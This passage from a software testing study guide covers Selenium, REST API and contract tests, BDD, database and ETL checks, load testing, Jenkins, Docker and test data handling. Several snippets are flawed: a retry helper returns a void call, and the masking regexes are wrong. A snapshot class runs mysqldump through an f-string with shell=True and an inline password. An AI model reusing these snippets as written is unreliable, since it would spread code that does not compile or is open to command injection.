        throw new UnsupportedOperationException("Penguins can't fly");
    }
}

// Good - correct hierarchy
public abstract class Bird { }

public class FlyingBird extends Bird {
    public void fly() { }
}

public class Penguin extends Bird { }
```

### Interface Segregation Principle
```java
// Bad - bloated interface
public interface WebElement {
    void click();
    void sendKeys(String text);
    String getText();
    void submit();
    void clear();
    boolean isEnabled();
    boolean isDisplayed();
    boolean isSelected();
    // ... 50 more methods
}

// Good - segregated interfaces
public interface Clickable {
    void click();
}

public interface InputField extends Clickable {
    void sendKeys(String text);
}

public interface Readable {
    String getText();
}
```

### Dependency Inversion Principle
```java
// Bad - depends on concrete class
public class LoginTest {
    private ChromeDriver driver = new ChromeDriver();
    
    public void login() {
        driver.get("https://app.com");
    }
}

// Good - depends on abstraction
public class LoginTest {
    private WebDriver driver;
    
    public LoginTest(WebDriver driver) {
        this.driver = driver;
    }
    
    public void login() {
        driver.get("https://app.com");
    }
}

// Usage
WebDriver driver = new ChromeDriver();
LoginTest test = new LoginTest(driver);

// Easy to test with mock
WebDriver mockDriver = mock(WebDriver.class);
LoginTest test = new LoginTest(mockDriver);
```

---

# 4. WEB AUTOMATION & SELENIUM ECOSYSTEM

## 4.1 Selenium WebDriver Architecture

**Three-Tier Architecture:**

```
┌─────────────────────────┐
│   Selenium WebDriver    │  (Client Library)
├─────────────────────────┤
│   JSON Wire Protocol    │  (Communication)
├─────────────────────────┤
│   Browser Driver        │  (Chrome/Firefox/Safari)
├─────────────────────────┤
│   Automation Atom       │  (Browser-specific)
├─────────────────────────┤
│   Browser               │  (Actual Browser)
└─────────────────────────┘
```

**How It Works:**
1. Test calls Selenium (e.g., `driver.get("url")`)
2. Selenium converts to JSON command
3. Sends to BrowserDriver (ChromeDriver, GeckoDriver)
4. Driver communicates with browser via WebSocket
5. Browser executes action
6. Response returns through chain

**Key Concepts:**

### WebDriver Interface
```java
public interface WebDriver {
    void get(String url);
    String getCurrentUrl();
    String getTitle();
    List<WebElement> findElements(By by);
    WebElement findElement(By by);
    void quit();
    Navigation navigate();
    Options manage();
}
```

### Locator Strategies

#### By ID (Fastest)
```java
WebElement element = driver.findElement(By.id("username"));
```

#### By CSS Selector (Fast)
```java
// Element
driver.findElement(By.cssSelector(".login-button"));

// Child
driver.findElement(By.cssSelector("form > button"));

// Attribute
driver.findElement(By.cssSelector("input[name='email']"));

// Multiple classes
driver.findElement(By.cssSelector("button.primary.large"));
```

#### By XPath (Slower, Most Flexible)
```java
// Absolute path (brittle)
driver.findElement(By.xpath("/html/body/div/form/input"));

// Relative path (preferred)
driver.findElement(By.xpath("//input[@name='email']"));

// Multiple attributes
driver.findElement(By.xpath("//button[@class='submit' and @type='button']"));

// Text matching
driver.findElement(By.xpath("//*[text()='Click Here']"));

// Contains
driver.findElement(By.xpath("//button[contains(text(), 'Sign')]"));

// Partial attribute
driver.findElement(By.xpath("//input[contains(@id, 'email')]"));
```

**XPath Best Practices:**
- Prefer `contains()` over exact matches (brittle)
- Use `//` not `/html/body//` (absolute paths break with layout changes)
- Combine attributes for uniqueness

### Implicit vs Explicit vs Fluent Waits

#### Implicit Wait
```java
// Once set, applies to all find operations
driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
driver.findElement(By.id("username"));  // Waits up to 10 seconds
```

**Problem:** Applies to every operation, can slow down tests

#### Explicit Wait
```java
// Only for specific elements
WebDriverWait wait = new WebDriverWait(driver, 10);
WebElement element = wait.until(
    ExpectedConditions.presenceOfElementLocated(By.id("username"))
);
```

**Better:** Fine-grained control

#### Fluent Wait
```java
// Custom waits with polling
Wait<WebDriver> wait = new FluentWait<>(driver)
    .withTimeout(10, TimeUnit.SECONDS)
    .pollingEvery(1, TimeUnit.SECONDS)
    .ignoring(StaleElementReferenceException.class);

WebElement element = wait.until(
    d -> d.findElement(By.id("result"))
);
```

**Best Practice:**
```java
// Utility class for consistent waits
public class WaitUtils {
    private WebDriver driver;
    private static final int TIMEOUT = 10;
    
    public WaitUtils(WebDriver driver) {
        this.driver = driver;
    }
    
    public void waitForElement(By locator) {
        WebDriverWait wait = new WebDriverWait(driver, TIMEOUT);
        wait.until(ExpectedConditions.visibilityOfElementLocated(locator));
    }
    
    public void waitForText(By locator, String text) {
        WebDriverWait wait = new WebDriverWait(driver, TIMEOUT);
        wait.until(ExpectedConditions.textToBePresentInElement(
            driver.findElement(locator), text
        ));
    }
    
    public void waitForAlert() {
        WebDriverWait wait = new WebDriverWait(driver, TIMEOUT);
        wait.until(ExpectedConditions.alertIsPresent());
    }
}
```

---

## 4.2 Handling Dynamic Elements

### AJAX Waits
```javascript
// Wait for jQuery AJAX calls to complete
WebDriverWait wait = new WebDriverWait(driver, 10);
wait.until(d -> {
    JavascriptExecutor js = (JavascriptExecutor) d;
    Object result = js.executeScript("return jQuery.active == 0");
    return (Boolean) result;
});
```

### Custom Wait Conditions
```java
public static ExpectedCondition<Boolean> textToChange(By locator, String previousText) {
    return driver -> {
        String currentText = driver.findElement(locator).getText();
        return !currentText.equals(previousText);
    };
}

// Usage
String initialText = driver.findElement(By.id("result")).getText();
wait.until(textToChange(By.id("result"), initialText));
```

### Shadow DOM Handling
```java
// Shadow DOM elements are not in regular DOM
// Method 1: JavaScript
Object shadowRoot = js.executeScript(
    "return document.querySelector('#host').shadowRoot.querySelector('#shadow-el')"
);

// Method 2: Use compound selectors (newer Selenium)
WebElement element = driver.findElement(By.cssSelector("my-custom-element::shadow #shadow-el"));
```

### Stale Element Reference
```java
// Problem: Element becomes stale after DOM update
WebElement element = driver.findElement(By.id("dynamic"));
// Page refreshes...
element.click();  // throws StaleElementReferenceException

// Solution 1: Re-find element
element = driver.findElement(By.id("dynamic"));
element.click();

// Solution 2: Handle exception
try {
    element.click();
} catch (StaleElementReferenceException e) {
    element = driver.findElement(By.id("dynamic"));
    element.click();
}

// Solution 3: Retry pattern
public WebElement safeClick(By locator, int retries) {
    for (int i = 0; i < retries; i++) {
        try {
            return driver.findElement(locator).click();
        } catch (StaleElementReferenceException e) {
            if (i == retries - 1) throw e;
        }
    }
    return null;
}
```

---

## 4.3 Actions Class

```java
Actions actions = new Actions(driver);

// Single click
actions.click(element).perform();

// Double click
actions.doubleClick(element).perform();

// Right click
actions.contextClick(element).perform();

// Drag and drop
actions.dragAndDrop(source, target).perform();

// Hover
actions.moveToElement(element).perform();

// Keyboard actions
actions.keyDown(Keys.SHIFT).sendKeys("a").keyUp(Keys.SHIFT).perform();

// Chain operations
actions
    .moveToElement(sourceElement)
    .pause(Duration.ofSeconds(1))
    .clickAndHold(sourceElement)
    .moveToElement(targetElement)
    .release()
    .perform();
```

---

## 4.4 JavaScript Execution

```java
JavascriptExecutor js = (JavascriptExecutor) driver;

// Execute simple JavaScript
js.executeScript("console.log('hello')");

// Return value
Long result = (Long) js.executeScript("return 1 + 1");

// Access DOM
String title = (String) js.executeScript("return document.title");

// Modify DOM
js.executeScript("document.body.style.background = 'red'");

// Scroll
js.executeScript("window.scrollBy(0, 500)");

// Get element property
String value = (String) js.executeScript("return arguments[0].value", element);

// Async script (waits for callback)
js.executeAsyncScript("var callback = arguments[arguments.length - 1]; " +
    "setTimeout(function() { callback('done'); }, 1000);");

// Inject jQuery
js.executeScript("var s = document.createElement('script');" +
    "s.src = 'https://code.jquery.com/jquery-3.6.0.min.js';" +
    "document.head.appendChild(s);");
```

---

## 4.5 Selenium Grid

**What It Is:**
Distribute tests across multiple machines/browsers.

**Architecture:**
```
┌─────────────┐
│   Test     │
│   Code     │
└──────┬──────┘
       │ (RemoteWebDriver)
       ▼
┌────────────────┐
│ Hub            │
│ (Dispatcher)   │
└────┬───────┬───┘
     │       │
   ┌─▼─┐  ┌─▼─┐
   │N1 │  │N2 │
   │Ch │  │FF │
   │Se │  │Se │
   └───┘  └───┘
   Node1  Node2
```

**Setup:**

Hub (Server):
```bash
java -jar selenium-server-4.0.0.jar hub
```

Node (Client):
```bash
java -jar selenium-server-4.0.0.jar node --host localhost --port 5555
```

**Usage:**
```java
String gridUrl = "http://localhost:4444";
ChromeOptions options = new ChromeOptions();
WebDriver driver = new RemoteWebDriver(new URL(gridUrl), options);
```

**Benefits:**
- Parallel test execution
- Multi-browser testing
- Distributed load
- Resource sharing

---

## 4.6 Headless Browser Testing

```java
// Headless Chrome
ChromeOptions options = new ChromeOptions();
options.addArguments("--headless");
options.addArguments("--window-size=1920,1080");
WebDriver driver = new ChromeDriver(options);

// Headless Firefox
FirefoxOptions options = new FirefoxOptions();
options.addArguments("--headless");
WebDriver driver = new FirefoxDriver(options);
```

**Advantages:**
- Faster execution
- Less resource usage
- Better for CI/CD

**Disadvantages:**
- Some features not available
- Limited debugging visibility

---

# 5. API TESTING & INTEGRATION TESTING

## 5.1 REST API Testing Fundamentals

**REST Principles:**
- **Resource-Based URLs** (not action-based)
- **HTTP Methods** for operations
- **Status Codes** for responses
- **Stateless** communication

**Bad Design:**
```
/getUser/123
/createUser
/deleteUser/456
```

**Good Design:**
```
GET /users/123
POST /users
DELETE /users/456
PUT /users/123
```

### HTTP Methods

| Method | Operation | Safe | Idempotent | Cacheable |
|--------|-----------|------|------------|-----------|
| GET    | Retrieve  | Yes  | Yes        | Yes       |
| POST   | Create    | No   | No         | No        |
| PUT    | Update    | No   | Yes        | No        |
| DELETE | Delete    | No   | Yes        | No        |
| PATCH  | Partial   | No   | No         | No        |

**Idempotent:** Calling multiple times = calling once

### HTTP Status Codes

| Code | Meaning |
|------|---------|
| 200  | OK |
| 201  | Created |
| 204  | No Content |
| 400  | Bad Request |
| 401  | Unauthorized |
| 403  | Forbidden |
| 404  | Not Found |
| 500  | Server Error |
| 502  | Bad Gateway |
| 503  | Service Unavailable |

---

## 5.2 REST API Testing with RestAssured

```java
// Simple GET
given()
    .when()
    .get("/users/1")
    .then()
    .statusCode(200)
    .body("name", equalTo("John"));

// POST with body
given()
    .contentType(ContentType.JSON)
    .body(new User("John", "john@test.com"))
    .when()
    .post("/users")
    .then()
    .statusCode(201)
    .body("id", notNullValue());

// Headers
given()
    .header("Authorization", "Bearer token123")
    .when()
    .get("/users")
    .then()
    .statusCode(200);

// Path and Query Parameters
given()
    .pathParam("userId", 1)
    .queryParam("sort", "name")
    .when()
    .get("/users/{userId}")
    .then()
    .statusCode(200);

// Extract Response
Response response = given()
    .when()
    .get("/users/1")
    .then()
    .extract()
    .response();

String name = response.path("name");
int id = response.path("id");

// JSON Path for complex assertions
given()
    .when()
    .get("/users")
    .then()
    .body("users.find{it.id == 1}.name", equalTo("John"));

// Logging
given()
    .log().all()
    .when()
    .get("/users")
    .then()
    .log().all()
    .statusCode(200);
```

---

## 5.3 Contract Testing

**Problem:**
Consumer and Provider can have mismatched expectations.

```
Provider: Returns { "name": "John", "email": "john@test.com" }
Consumer: Expects { "username": "John", "mail": "john@test.com" }
Result: Consumer breaks, but provider tests pass
```

**Solution: Consumer-Driven Contract Testing**

```java
// Provider (API)
@RunWith(SpringRunner.class)
@SpringBootTest
@PactTestFor(providerName = "UserProvider")
public class UserProviderTest {
    @Pact(provider = "UserProvider", consumer = "UserConsumer")
    public Pact createPact(PactDslWithProvider builder) {
        return builder
            .given("user 1 exists")
            .uponReceiving("a request for user 1")
            .path("/users/1")
            .method("GET")
            .willRespondWith()
            .status(200)
            .body(newJsonObject(o -> {
                o.stringValue("name", "John");
                o.stringValue("email", "john@test.com");
            }).build())
            .toPact();
    }
}

// Consumer (Application)
public class UserConsumerTest {
    @Test
    public void shouldGetUser() {
        UserService service = new UserService("http://localhost:8080");
        User user = service.getUser(1);
        
        assertThat(user.getName()).isEqualTo("John");
        assertThat(user.getEmail()).isEqualTo("john@test.com");
    }
}
```

**Workflow:**
1. Consumer writes contract
2. Provider implements API to match contract
3. Contract validates both sides
4. Breaking changes detected early

---

## 5.4 API Authentication Testing

### API Key Authentication
```java
given()
    .header("X-API-Key", "secret123")
    .when()
    .get("/users")
    .then()
    .statusCode(200);

// Test invalid key
given()
    .header("X-API-Key", "invalid")
    .when()
    .get("/users")
    .then()
    .statusCode(401);
```

### Bearer Token (OAuth2)
```java
// Get token
Response tokenResponse = given()
    .auth().basic("client_id", "client_secret")
    .formParam("grant_type", "client_credentials")
    .when()
    .post("/oauth/token")
    .then()
    .extract()
    .response();

String token = tokenResponse.path("access_token");

// Use token
given()
    .auth().oauth2(token)
    .when()
    .get("/users")
    .then()
    .statusCode(200);
```

### JWT (JSON Web Token)
```java
// JWT structure: header.payload.signature
String token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." +
    "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwi..." +
    "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

given()
    .header("Authorization", "Bearer " + token)
    .when()
    .get("/users")
    .then()
    .statusCode(200);
```

---

## 5.5 Microservices Testing

**Challenge:** Services have dependencies

```
User Service → Order Service → Payment Service
```

### Service Virtualization
Mock dependent services:
```java
// Mock Payment Service
@BeforeEach
public void setupMocks() {
    stubFor(post(urlEqualTo("/payments/process"))
        .willReturn(aResponse()
            .withStatus(200)
            .withJsonBody("{\"status\": \"success\"}")));
}

// Test Order Service (Payment Service is mocked)
@Test
public void shouldProcessOrder() {
    given()
        .body(new Order(100, "USD"))
        .when()
        .post("/orders")
        .then()
        .statusCode(201);
}
```

### Contract Testing in Microservices
Each service validates contracts with dependencies:
```
User Service <--contract--> Order Service
Order Service <--contract--> Payment Service
```

### Integration Testing Approach
```java
@SpringBootTest
public class OrderServiceIntegrationTest {
    @Autowired
    private OrderService orderService;
    
    @MockBean
    private PaymentService paymentService;
    
    @Test
    public void shouldCreateOrder() {
        when(paymentService.process(any())).thenReturn(true);
        
        Order order = orderService.create(new Order(...));
        
        assertThat(order.getId()).isNotNull();
        verify(paymentService).process(any());
    }
}
```

---

# 6. BDD & GHERKIN

## 6.1 Gherkin Syntax

```gherkin
Feature: User Login
  As a user
  I want to login to the application
  So that I can access my dashboard

  Scenario: Successful login with valid credentials
    Given I am on the login page
    When I enter email "user@test.com"
    And I enter password "secure123"
    And I click the login button
    Then I should see the dashboard
    And I should see my user profile

  Scenario: Login fails with invalid credentials
    Given I am on the login page
    When I enter email "user@test.com"
    And I enter password "wrong"
    And I click the login button
    Then I should see an error message "Invalid credentials"

  Scenario Outline: Login with multiple users
    Given I am on the login page
    When I enter email "<email>"
    And I enter password "<password>"
    And I click the login button
    Then I should <result>

    Examples:
      | email           | password  | result              |
      | john@test.com   | correct   | see the dashboard   |
      | john@test.com   | wrong     | see an error message |
      | invalid@test.com | correct   | see an error message |
```

**Keywords:**
- **Feature:** High-level description
- **Scenario:** Test case
- **Scenario Outline:** Parameterized test
- **Given:** Preconditions
- **When:** Actions
- **Then:** Expected results
- **And:** Continuation
- **But:** Negative continuation
- **Examples:** Test data

---

## 6.2 Cucumber/Serenity Implementation

```java
// Step Definitions
public class LoginSteps {
    
    private LoginPage loginPage;
    
    @Given("I am on the login page")
    public void navigateToLoginPage() {
        loginPage = new LoginPage(driver);
        loginPage.navigate();
    }
    
    @When("I enter email {string}")
    public void enterEmail(String email) {
        loginPage.enterEmail(email);
    }
    
    @And("I enter password {string}")
    public void enterPassword(String password) {
        loginPage.enterPassword(password);
    }
    
    @And("I click the login button")
    public void clickLoginButton() {
        loginPage.clickLoginButton();
    }
    
    @Then("I should see the dashboard")
    public void verifyDashboardVisible() {
        assertThat(loginPage.isDashboardVisible()).isTrue();
    }
    
    @Then("I should see an error message {string}")
    public void verifyErrorMessage(String expectedMessage) {
        assertThat(loginPage.getErrorMessage()).isEqualTo(expectedMessage);
    }
}

// Runner
@RunWith(Cucumber.class)
@CucumberOptions(
    features = "src/test/resources/features",
    glue = "com.test.steps",
    plugin = {"pretty", "json:target/cucumber-report.json"}
)
public class CucumberRunner {
}
```

---

## 6.3 Data Tables in BDD

```gherkin
Scenario: Create multiple users
  Given I am on the user creation page
  When I create users with following details:
    | firstName | lastName | email            | age |
    | John      | Doe      | john@test.com    | 25  |
    | Jane      | Smith    | jane@test.com    | 30  |
    | Bob       | Johnson  | bob@test.com     | 28  |
  Then all users should be created successfully
  And total users should be 3
```

**Implementation:**
```java
@When("I create users with following details:")
public void createMultipleUsers(DataTable dataTable) {
    List<Map<String, String>> users = dataTable.asMaps(String.class, String.class);
    
    for (Map<String, String> user : users) {
        String firstName = user.get("firstName");
        String lastName = user.get("lastName");
        String email = user.get("email");
        int age = Integer.parseInt(user.get("age"));
        
        userPage.fillForm(firstName, lastName, email, age);
        userPage.submitForm();
    }
}

@Then("all users should be created successfully")
public void verifyAllUsersCreated() {
    assertThat(userPage.getSuccessMessages()).hasSize(3);
}
```

---

# 7. DATABASE TESTING

## 7.1 SQL Fundamentals for QA

### SELECT Queries
```sql
-- Basic select
SELECT * FROM users;

-- Specific columns
SELECT name, email FROM users;

-- With conditions
SELECT * FROM users WHERE age > 18;

-- Multiple conditions
SELECT * FROM users WHERE age > 18 AND status = 'active';

-- Sorting
SELECT * FROM users ORDER BY name ASC;

-- Limiting results
SELECT * FROM users LIMIT 10;

-- Counting
SELECT COUNT(*) FROM users;

-- Distinct values
SELECT DISTINCT status FROM users;

-- Grouping and aggregation
SELECT status, COUNT(*) as count FROM users GROUP BY status;

-- Join tables
SELECT u.name, o.order_id FROM users u 
JOIN orders o ON u.id = o.user_id;

-- Subqueries
SELECT * FROM users WHERE id IN (SELECT user_id FROM orders);
```

### INSERT/UPDATE/DELETE
```sql
-- Insert
INSERT INTO users (name, email, age) VALUES ('John', 'john@test.com', 25);

-- Update
UPDATE users SET age = 26 WHERE name = 'John';

-- Delete
DELETE FROM users WHERE age < 18;

-- Transactions
BEGIN TRANSACTION;
UPDATE users SET balance = balance - 100 WHERE id = 1;
UPDATE users SET balance = balance + 100 WHERE id = 2;
COMMIT;
```

---

## 7.2 Data Integrity Testing

```java
public class DataIntegrityTest {
    
    private Connection conn;
    private Statement stmt;
    
    @BeforeEach
    public void setup() throws SQLException {
        conn = DriverManager.getConnection("jdbc:mysql://localhost/testdb", "user", "pass");
        stmt = conn.createStatement();
    }
    
    @Test
    public void testForeignKeyConstraint() throws SQLException {
        // Try to insert order for non-existent user
        stmt.executeUpdate("INSERT INTO orders (user_id, amount) VALUES (9999, 100)");
        
        // Should fail due to foreign key constraint
        assertThrows(SQLException.class, () -> {
            conn.commit();
        });
    }
    
    @Test
    public void testUniqueConstraint() throws SQLException {
        stmt.executeUpdate("INSERT INTO users (email) VALUES ('john@test.com')");
        
        // Try to insert duplicate email
        assertThrows(SQLException.class, () -> {
            stmt.executeUpdate("INSERT INTO users (email) VALUES ('john@test.com')");
        });
    }
    
    @Test
    public void testNotNullConstraint() throws SQLException {
        // Email is required
        assertThrows(SQLException.class, () -> {
            stmt.executeUpdate("INSERT INTO users (name, email) VALUES ('John', NULL)");
        });
    }
    
    @Test
    public void testCheckConstraint() throws SQLException {
        // Age must be >= 0
        assertThrows(SQLException.class, () -> {
            stmt.executeUpdate("INSERT INTO users (name, age) VALUES ('John', -5)");
        });
    }
    
    @AfterEach
    public void cleanup() throws SQLException {
        stmt.close();
        conn.close();
    }
}
```

---

## 7.3 ETL Testing

ETL = Extract, Transform, Load

```java
@Test
public void testDataExtraction() throws SQLException {
    // Extract data from source
    String sql = "SELECT * FROM source_table WHERE status = 'active'";
    List<Map<String, Object>> sourceData = executeQuery(sql);
    
    assertThat(sourceData).isNotEmpty();
    assertThat(sourceData.size()).isGreaterThan(0);
}

@Test
public void testDataTransformation() {
    // Raw data
    Map<String, Object> raw = new HashMap<>();
    raw.put("name", "john smith");
    raw.put("birthdate", "1990-01-15");
    
    // Transform
    Map<String, Object> transformed = transformData(raw);
    
    // Verify
    assertThat(transformed.get("name")).isEqualTo("John Smith");  // Capitalized
    assertThat(transformed.get("age")).isEqualTo(34);  // Calculated from date
}

@Test
public void testDataLoad() throws SQLException {
    // Load transformed data into target
    Map<String, Object> data = new HashMap<>();
    data.put("name", "John Smith");
    data.put("email", "john@test.com");
    
    insertData("users", data);
    
    // Verify
    List<Map<String, Object>> result = queryData("users", "email = 'john@test.com'");
    assertThat(result).hasSize(1);
}

@Test
public void testDataConsistency() throws SQLException {
    // Verify row counts match before/after
    int sourceCount = getCount("source_table");
    executeETL();
    int targetCount = getCount("target_table");
    
    assertThat(targetCount).isEqualTo(sourceCount);
}

@Test
public void testDataQuality() throws SQLException {
    // Check for duplicates
    String sql = "SELECT email, COUNT(*) FROM users GROUP BY email HAVING COUNT(*) > 1";
    List<Map<String, Object>> duplicates = executeQuery(sql);
    
    assertThat(duplicates).isEmpty();
    
    // Check for nulls in required fields
    sql = "SELECT COUNT(*) FROM users WHERE email IS NULL";
    int nullCount = (int) executeScalar(sql);
    
    assertThat(nullCount).isEqualTo(0);
}
```

---

# 8. PERFORMANCE & LOAD TESTING

## 8.1 Performance Testing Terminology

### Key Metrics

**Response Time (Latency):**
- Time from request to response
- Good: < 2 seconds
- Acceptable: < 5 seconds
- Poor: > 5 seconds

**Throughput:**
- Requests processed per second
- Measured in transactions per second (TPS)
- Example: "System handles 1000 TPS"

**Concurrent Users:**
- Simultaneous users on system
- Test with various levels (10, 50, 100, 500 users)

**Error Rate:**
- Percentage of failed requests
- Good: < 1%
- Threshold: > 5% indicates problems

**Resource Utilization:**
- CPU, Memory, Disk I/O usage
- Should not exceed 80% under normal load

---

## 8.2 Load Testing with JMeter

```xml
<!-- JMeter Test Plan (jmx file) -->
<jmeterTestPlan version="1.2">
  <hashTree>
    <TestPlan>
      <name>Performance Test</name>
      <SerializeThreadgroups>false</SerializeThreadgroups>
    </TestPlan>
    
    <ThreadGroup>
      <name>User Group</name>
      <num_threads>100</num_threads>  <!-- 100 concurrent users -->
      <ramp_time>60</ramp_time>       <!-- Ramp up over 60 seconds -->
      <duration>300</duration>         <!-- Test duration: 300 seconds -->
    </ThreadGroup>
    
    <HTTPSampler>
      <name>Login Request</name>
      <domain>api.example.com</domain>
      <port>443</port>
      <path>/api/login</path>
      <method>POST</method>
    </HTTPSampler>
    
    <ResultCollector>
      <name>Results</name>
      <filename>results.jtl</filename>
    </ResultCollector>
  </hashTree>
</jmeterTestPlan>
```

**Command Line:**
```bash
jmeter -n -t test_plan.jmx -l results.jtl -j jmeter.log -e -o report/
```

---

## 8.3 Load Testing with Gatling

```scala
package simulations

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

class LoadTestSimulation extends Simulation {

  val httpProtocol = http
    .baseUrl("https://api.example.com")
    .acceptHeader("application/json")

  val scn = scenario("API Load Test")
    .exec(http("Login")
      .post("/api/login")
      .body(StringBody("""{"email": "user@test.com", "password": "pass"}"""))
      .check(status.is(200))
      .check(jsonPath("$.token").saveAs("token")))
    
    .pause(2)
    
    .exec(http("Get Users")
      .get("/api/users")
      .header("Authorization", "Bearer ${token}")
      .check(status.is(200))
      .check(jsonPath("$.length()").greaterThan(0)))
    
    .pause(1)
    
    .exec(http("Create User")
      .post("/api/users")
      .body(StringBody("""{"name": "John", "email": "john@test.com"}"""))
      .header("Authorization", "Bearer ${token}")
      .check(status.is(201)))

  setUp(
    scn.inject(
      rampUsers(100) during (60 seconds)  // Ramp to 100 users over 60s
    )
  ).protocols(httpProtocol)
    .maxDuration(5 minutes)
}
```

---

## 8.4 Identifying Performance Bottlenecks

```java
@Test
public void profilePerformance() throws Exception {
    // Measure response time
    long startTime = System.currentTimeMillis();
    
    for (int i = 0; i < 1000; i++) {
        driver.get("https://example.com");
    }
    
    long endTime = System.currentTimeMillis();
    long totalTime = endTime - startTime;
    
    System.out.println("Average response: " + (totalTime / 1000) + "ms");
    System.out.println("Total time: " + totalTime + "ms");
    
    assertThat(totalTime / 1000).isLessThan(2000);  // < 2 seconds average
}
```

**Tools for Analysis:**
- Chrome DevTools (Network tab)
- JMeter's "Aggregate Report"
- Gatling's HTML reports
- New Relic, DataDog (APM tools)

---

# 9. CI/CD & DEVOPS

## 9.1 Jenkins Pipeline

```groovy
pipeline {
    agent any
    
    environment {
        GITHUB_CREDENTIALS = credentials('github-token')
        SLACK_WEBHOOK = credentials('slack-webhook')
    }
    
    stages {
        stage('Checkout') {
            steps {
                git branch: 'main', url: 'https://github.com/org/repo.git'
            }
        }
        
        stage('Build') {
            steps {
                sh 'mvn clean compile'
            }
        }
        
        stage('Unit Tests') {
            steps {
                sh 'mvn test'
            }
        }
        
        stage('SonarQube') {
            steps {
                sh '''
                    mvn sonar:sonar \
                        -Dsonar.projectKey=myproject \
                        -Dsonar.host.url=http://sonarqube:9000 \
                        -Dsonar.login=token
                '''
            }
        }
        
        stage('Integration Tests') {
            steps {
                sh 'mvn verify -P integration-tests'
            }
        }
        
        stage('Deploy to Staging') {
            when {
                branch 'main'
            }
            steps {
                sh '''
                    docker build -t myapp:${BUILD_NUMBER} .
                    docker push registry.example.com/myapp:${BUILD_NUMBER}
                    kubectl apply -f k8s/staging-deployment.yaml
                '''
            }
        }
        
        stage('Smoke Tests') {
            steps {
                sh 'mvn test -P smoke-tests'
            }
        }
        
        stage('E2E Tests') {
            parallel {
                stage('Chrome Tests') {
                    steps {
                        sh 'mvn test -P e2e-tests -Dbrowser=chrome'
                    }
                }
                stage('Firefox Tests') {
                    steps {
                        sh 'mvn test -P e2e-tests -Dbrowser=firefox'
                    }
                }
            }
        }
        
        stage('Deploy to Production') {
            when {
                tag pattern: "v\\d+\\.\\d+\\.\\d+", comparator: "REGEXP"
            }
            steps {
                sh 'kubectl apply -f k8s/prod-deployment.yaml'
            }
        }
    }
    
    post {
        always {
            junit 'target/surefire-reports/**/*.xml'
            publishHTML([
                reportDir: 'target/surefire-reports',
                reportFiles: 'index.html',
                reportName: 'Test Report'
            ])
        }
        
        success {
            sh '''
                curl -X POST ${SLACK_WEBHOOK} \
                    -H 'Content-Type: application/json' \
                    -d '{"text": "Build #${BUILD_NUMBER} passed!"}'
            '''
        }
        
        failure {
            sh '''
                curl -X POST ${SLACK_WEBHOOK} \
                    -H 'Content-Type: application/json' \
                    -d '{"text": "Build #${BUILD_NUMBER} failed!"}'
            '''
        }
    }
}
```

---

## 9.2 Docker for Test Environments

```dockerfile
FROM ubuntu:20.04

# Install Java
RUN apt-get update && apt-get install -y openjdk-11-jdk

# Install Maven
RUN apt-get install -y maven

# Install Chrome and Chromedriver
RUN apt-get install -y chromium-browser chromium-chromedriver

# Copy test code
COPY . /app
WORKDIR /app

# Run tests
CMD ["mvn", "test"]
```

**Docker Compose:**
```yaml
version: '3'
services:
  test-runner:
    build: .
    depends_on:
      - database
      - api-mock
    environment:
      DB_HOST: database
      API_URL: http://api-mock:8080

  database:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: testdb

  api-mock:
    image: mockserver:latest
    ports:
      - "8080:1080"
```

---

## 9.3 Kubernetes for Test Orchestration

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: automation-tests
spec:
  parallelism: 4  # Run 4 test pods in parallel
  template:
    spec:
      containers:
      - name: test-runner
        image: myregistry/test-runner:latest
        env:
        - name: TEST_SUITE
          value: "e2e"
        - name: BROWSER
          value: "chrome"
        volumeMounts:
        - name: test-reports
          mountPath: /reports
      volumes:
      - name: test-reports
        emptyDir: {}
      restartPolicy: Never
  backoffLimit: 3
```

---

# 10. TEST DATA MANAGEMENT

## 10.1 Test Data Strategy

**Approach 1: Random Data**
```python
import uuid
import random

def generate_test_user():
    return {
        "email": f"user_{uuid.uuid4().hex[:8]}@test.com",
        "name": f"User {random.randint(1, 1000)}",
        "age": random.randint(18, 80)
    }
```

**Approach 2: Fixed Data**
```python
TEST_USERS = [
    {"email": "john@test.com", "name": "John Doe", "age": 25},
    {"email": "jane@test.com", "name": "Jane Smith", "age": 30},
]
```

**Approach 3: Data Factory**
```java
public class UserFactory {
    public static User createValidUser() {
        return new User()
            .setName("John Doe")
            .setEmail("john@test.com")
            .setPassword("SecurePass123!");
    }
    
    public static User createInvalidUser() {
        return new User()
            .setName("")
            .setEmail("invalid-email")
            .setPassword("");
    }
    
    public static User createAdminUser() {
        return createValidUser()
            .setRole("ADMIN");
    }
}
```

---

## 10.2 Data Masking & Anonymization

```java
public class DataMasker {
    
    public static String maskEmail(String email) {
        int atIndex = email.indexOf('@');
        return email.substring(0, 2) + "****" + email.substring(atIndex);
    }
    
    public static String maskPhoneNumber(String phone) {
        return phone.replaceAll("\\d{6}", "****");
    }
    
    public static String maskCreditCard(String card) {
        return card.replaceAll("\\d{12}", "****");
    }
    
    public static Map<String, Object> maskUserData(User user) {
        return Map.of(
            "name", user.getName(),
            "email", maskEmail(user.getEmail()),
            "phone", maskPhoneNumber(user.getPhone()),
            "ssn", user.getSsn().replaceAll("\\d{5}", "*****")
        );
    }
}
```

---

## 10.3 Database Snapshots & Restoration

```bash
# MySQL - Take snapshot
mysqldump -u root -p testdb > backup.sql

# MySQL - Restore snapshot
mysql -u root -p testdb < backup.sql

# PostgreSQL - Take snapshot
pg_dump testdb > backup.sql

# PostgreSQL - Restore snapshot
psql testdb < backup.sql

# MongoDB - Snapshot
mongodump --db testdb --out ./backup/

# MongoDB - Restore
mongorestore ./backup/
```

**Automation:**
```python
import subprocess
import os
from datetime import datetime

class DatabaseSnapshot:
    def __init__(self, db_name, db_user, db_password):
        self.db_name = db_name
        self.db_user = db_user
        self.db_password = db_password
    
    def take_snapshot(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.db_name}_{timestamp}.sql"
        
        cmd = f"mysqldump -u {self.db_user} -p{self.db_password} {self.db_name} > {filename}"
        subprocess.run(cmd, shell=True)
        return filename
    
    def restore_snapshot(self, filename):
        cmd = f"mysql -u {self.db_user} -p{self.db_password} {self.db_name} < {filename}"
